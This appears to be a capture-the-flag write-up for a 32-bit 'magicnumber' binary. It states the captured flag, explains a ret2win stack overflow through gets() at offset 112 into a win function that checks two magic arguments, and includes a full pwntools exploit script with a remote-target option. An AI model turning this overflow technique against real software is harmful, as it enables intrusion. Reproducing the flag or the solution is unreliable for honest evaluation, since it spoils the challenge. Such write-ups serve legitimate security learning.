The flag is `flag{c0ngr4ts_y0u_p0pp3d_my_st4ck_4nd_4ll_i_g0t_w4s_th1s_fl4g}`.

It’s a straight ret2win. `vuln()` uses `gets()` on a buffer at `[ebp-0x6c]`, and the saved return address is 112 bytes later. The real target is `win` at `0x08049284`, and it checks two stack arguments:

- `0xcafebebe`
- `0x13371337`

So the payload is:

```python
b"A"*112 +
p32(0x08049284) +
p32(0x41414141) +
p32(0xcafebebe) +
p32(0x13371337)
```

That works against the remote and prints the flag above.

MAGIC Number
#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF("/home/parth/HACK/magicnumber", checksec=False)
context.arch = "i386"

OFFSET = 112
WIN = 0x08049284
MAGIC1 = 0xCAFEBEBE
MAGIC2 = 0x13371337


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 31337)
        return remote(host, port)

    return process(context.binary.path)


def build_payload():
    # i386 cdecl: ret into win, then place a dummy return and the two args.
    return flat(
        b"A" * OFFSET,
        WIN,
        0x41414141,
        MAGIC1,
        MAGIC2,
    )


def main():
    io = start()
    io.recvuntil(b"Please enter your authentication string: ")
    io.sendline(build_payload())

    data = io.recvall(timeout=2)
    print(data.decode("latin-1", errors="replace"))

    match = re.search(rb"flag\{[^}]+\}", data)
    if match:
        log.success(f"flag = {match.group().decode()}")


if __name__ == "__main__":
    main()
